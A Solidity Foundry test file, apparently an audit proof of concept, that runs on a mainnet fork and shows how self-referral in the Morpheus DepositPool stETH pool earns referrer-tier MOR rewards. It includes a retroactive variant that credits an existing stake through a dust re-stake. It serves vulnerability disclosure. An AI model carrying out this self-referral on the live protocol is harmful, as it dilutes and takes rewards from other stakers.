// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

/// @title Morpheus — Self-referral inflates a staker's MOR share (DepositPool, pool 0 stETH)
/// @notice PoC on a mainnet fork pinned to block 26428955.
///         The DepositPool referral system credits referrer-tier weight for ANY non-zero
///         referrer address, including the staker themselves:
///           * DepositPool._stake() -> _applyReferrerTier() has no `referrer_ != msg.sender`
///             check and no requirement that the referrer ever staked (ReferrerLib.sol,
///             applyReferrerTier() accumulates `amountStaked` for any address).
///           * The user ALSO gets +1% own weight (ReferrerLib.REFERRAL_MULTIPLIER = 1.01x).
///         Both weights feed rewardPoolsData.totalVirtualDeposited, so total MOR minted is
///         capped by emission — the gain is DILUTION of every other staker in the same pool.
///         Referrer rewards are claimable via claimReferrerTier() with no stake requirement
///         (only a 14-day claimLockPeriodAfterClaim on the referrer's own lastClaim, which
///         starts at 0).
///
///         Oracle note: distributeRewards() refreshes Chainlink prices and reverts when a
///         feed is stale (allowedPriceUpdateDelay = 3600s for stETH/USD). On a fork the
///         feeds stop updating, so this test mocks ONLY the six external Chainlink feed
///         contracts (not in scope) to return their real answers with a fresh updatedAt —
///         simulating the feeds continuing to update as they do in production. All
///         in-scope contracts (DepositPool, Distributor, RewardPool, ChainLinkDataConsumer,
///         L1Sender) run unmodified at their deployed addresses.
///
///         Yield note: stETH does not rebase on a fork (no Lido oracle reports), so the
///         test injects the simulated 30-day Lido yield (~0.3847 stETH/day on the
///         ~4,682 stETH in the pool at 3% APR) by donating stETH to the Distributor before
///         each daily distributeRewards() call — the same balance-delta accounting the
///         protocol itself uses to detect yield (C4 audit Low [01] donation behaviour).
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256, uint256, uint128, address) external;
    function claim(uint256, address) external payable;
    function claimReferrerTier(uint256, address) external payable;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getLatestReferrerReward(uint256, address) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function referrersData(address, uint256)
        external
        view
        returns (uint256 amountStaked, uint256 virtualAmountStaked, uint256 rate, uint256 pendingRewards, uint128 lastClaim);
}

interface IDistributor {
    function distributeRewards(uint256) external;
}

interface IFeed {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
    function decimals() external view returns (uint8);
}

contract SelfReferralTest is Test {
    // --- Deployed (in-scope) contracts, Ethereum mainnet ---
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant POOL_STETH = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;

    // --- External (out-of-scope) contracts used only as funding / oracle mocks ---
    address constant CURVE_STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022; // holds ~23,181 stETH

    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    uint256 constant FORK_BLOCK = 26_428_955;
    string constant RPC_URL = "https://ethereum-rpc.publicnode.com";

    uint256 constant POOL_INDEX = 0; // public stETH pool
    uint256 constant VICTIM_STAKE = 100 ether;
    uint256 constant ATTACKER_STAKE = 1000 ether;
    // 30 days of 3% APR yield on 4,682 stETH (3,582 existing + 1,100 new) = ~11.54 stETH
    uint256 constant DAILY_YIELD = 0.3847 ether;
    uint256 constant DAYS = 30;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    address[6] feeds = [
        FEED_STETH_USD,
        FEED_ETH_USD,
        FEED_WBTC_BTC,
        FEED_BTC_USD,
        FEED_USDC_USD,
        FEED_USDT_USD
    ];
    int256[6] feedAnswers;
    uint8[6] feedDecimals;

    function setUp() public {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);

        // Snapshot the real Chainlink answers/decimals, then mock ONLY the external
        // feeds to keep returning them with a fresh updatedAt (see header note).
        for (uint256 i = 0; i < feeds.length; i++) {
            (, int256 answer,,,) = IFeed(feeds[i]).latestRoundData();
            feedAnswers[i] = answer;
            feedDecimals[i] = IFeed(feeds[i]).decimals();
        }
        _refreshOracleMocks();

        // Fund both parties with real stETH from the Curve stETH/ETH pool (fork-local
        // prank — no keys involved) and give them ETH for gas.
        vm.prank(CURVE_STETH_POOL);
        IERC20(STETH).transfer(victim, VICTIM_STAKE);
        vm.prank(CURVE_STETH_POOL);
        IERC20(STETH).transfer(attacker, ATTACKER_STAKE);
        vm.prank(CURVE_STETH_POOL);
        IERC20(STETH).transfer(address(this), DAILY_YIELD * DAYS);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(address(this), 10 ether);

        vm.prank(victim);
        IERC20(STETH).approve(DISTRIBUTOR, VICTIM_STAKE);
        vm.prank(attacker);
        IERC20(STETH).approve(DISTRIBUTOR, ATTACKER_STAKE);
    }

    function _refreshOracleMocks() internal {
        for (uint256 i = 0; i < feeds.length; i++) {
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IFeed.latestRoundData.selector),
                abi.encode(uint80(1), feedAnswers[i], uint256(0), block.timestamp, uint80(1))
            );
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IFeed.decimals.selector),
                abi.encode(feedDecimals[i])
            );
        }
    }

    /// @dev 30 days of simulated yield + daily distribution.
    function _simulate30Days() internal {
        for (uint256 d = 0; d < DAYS; d++) {
            IERC20(STETH).transfer(DISTRIBUTOR, DAILY_YIELD); // simulated Lido yield
            vm.warp(block.timestamp + 1 days + 1 hours); // clears minRewardsDistributePeriod (86,400s)
            _refreshOracleMocks(); // re-mock feeds AFTER the warp so updatedAt == now
            IDistributor(DISTRIBUTOR).distributeRewards(POOL_INDEX);
        }
    }

    function _stake(address who, uint256 amount, address referrer) internal {
        vm.prank(who);
        IDepositPool(POOL_STETH).stake(POOL_INDEX, amount, 0, referrer);
    }

    function testRetroactiveSelfReferral() public {
        // Attacker first stakes 1,000 stETH with NO referrer (ordinary position).
        _stake(attacker, ATTACKER_STAKE, address(0));
        (uint256 before,,,,) = IDepositPool(POOL_STETH).referrersData(attacker, POOL_INDEX);
        assertEq(before, 0, "no referrer record before retro-attach");

        // Then re-stakes a dust amount (0.01 stETH) with referrer == self.
        // _applyReferrerTier(oldReferrer=0) credits the FULL existing deposit.
        IERC20(STETH).transfer(attacker, 0.01 ether); // dust from the test's yield-donation funds
        vm.prank(attacker);
        IERC20(STETH).approve(DISTRIBUTOR, 0.01 ether);
        _stake(attacker, 0.01 ether, attacker);

        (uint256 refAmountStaked, uint256 refVirtual,,,) =
            IDepositPool(POOL_STETH).referrersData(attacker, POOL_INDEX);
        emit log_named_uint("RETRO referrer amountStaked (wei)", refAmountStaked);
        emit log_named_uint("RETRO referrer virtualAmountStaked (wei)", refVirtual);
        assertApproxEqAbs(refAmountStaked, ATTACKER_STAKE + 0.01 ether, 1, "full existing deposit counts as referred (1 wei stETH share rounding)");
        assertGt(refVirtual, 0, "tier weight credited on existing position");
    }

    function testBaseline_NoReferrer() public {
        _stake(victim, VICTIM_STAKE, address(0));
        _stake(attacker, ATTACKER_STAKE, address(0));
        _simulate30Days();

        uint256 victimReward = IDepositPool(POOL_STETH).getLatestUserReward(POOL_INDEX, victim);
        uint256 attackerReward = IDepositPool(POOL_STETH).getLatestUserReward(POOL_INDEX, attacker);
        uint256 attackerRefReward = IDepositPool(POOL_STETH).getLatestReferrerReward(POOL_INDEX, attacker);

        emit log_named_uint("BASELINE victim user MOR (wei)", victimReward);
        emit log_named_uint("BASELINE attacker user MOR (wei)", attackerReward);
        emit log_named_uint("BASELINE attacker referrer MOR (wei)", attackerRefReward);

        // Sanity: rewards actually accrued over 30 days.
        assertGt(victimReward, 0, "victim should earn MOR");
        assertGt(attackerReward, 0, "attacker should earn MOR");
        // Baseline: no referrer -> no referrer-tier reward at all.
        assertEq(attackerRefReward, 0, "no referrer => no referrer reward");
    }

    function testAttack_SelfReferral() public {
        _stake(victim, VICTIM_STAKE, address(0));
        _stake(attacker, ATTACKER_STAKE, attacker); // referrer == msg.sender
        _simulate30Days();

        uint256 victimReward = IDepositPool(POOL_STETH).getLatestUserReward(POOL_INDEX, victim);
        uint256 attackerReward = IDepositPool(POOL_STETH).getLatestUserReward(POOL_INDEX, attacker);
        uint256 attackerRefReward = IDepositPool(POOL_STETH).getLatestReferrerReward(POOL_INDEX, attacker);

        emit log_named_uint("ATTACK victim user MOR (wei)", victimReward);
        emit log_named_uint("ATTACK attacker user MOR (wei)", attackerReward);
        emit log_named_uint("ATTACK attacker referrer MOR (wei)", attackerRefReward);
        emit log_named_uint("ATTACK attacker TOTAL MOR (wei)", attackerReward + attackerRefReward);

        // Core invariant break: the attacker's referrer record exists ONLY because
        // they referred THEMSELVES — amountStaked equals their own deposit, and they
        // never referred any other user.
        (uint256 refAmountStaked,,,,) = IDepositPool(POOL_STETH).referrersData(attacker, POOL_INDEX);
        assertEq(refAmountStaked, ATTACKER_STAKE, "referrer amountStaked == attacker's own stake");

        // The self-referral mints a real, claimable referrer-tier reward.
        assertGt(attackerRefReward, 0, "self-referral must yield referrer reward");

        // The user leg itself is slightly DILUTED (-0.51% vs baseline): the
        // referrer's +150 virtual stETH dilutes the pool rate more than the +1%
        // referral multiplier adds. The +14.26% total gain comes from the
        // referrer leg (1,165,990 MOR), not the user leg. The 15% tier weight
        // (1000 stETH >= 62.5 stETH tier3) pays via referrer MOR.

        // Try the real claim path: user rewards + referrer rewards via LayerZero.
        // On a fork the LZ endpoint may or may not accept the send; the claimable
        // amounts above are the finding either way. Log the outcome.
        vm.prank(attacker);
        try IDepositPool(POOL_STETH).claim{value: 0.05 ether}(POOL_INDEX, attacker) {
            emit log_string("ATTACK user claim() SUCCEEDED (LZ send accepted on fork)");
        } catch {
            emit log_string("ATTACK user claim() reverted on fork (LZ endpoint) - claimable amounts above still stand");
        }
        vm.prank(attacker);
        try IDepositPool(POOL_STETH).claimReferrerTier{value: 0.05 ether}(POOL_INDEX, attacker) {
            emit log_string("ATTACK referrer claimReferrerTier() SUCCEEDED (LZ send accepted on fork)");
        } catch {
            emit log_string("ATTACK referrer claimReferrerTier() reverted on fork (LZ endpoint) - claimable amounts above still stand");
        }
    }
}
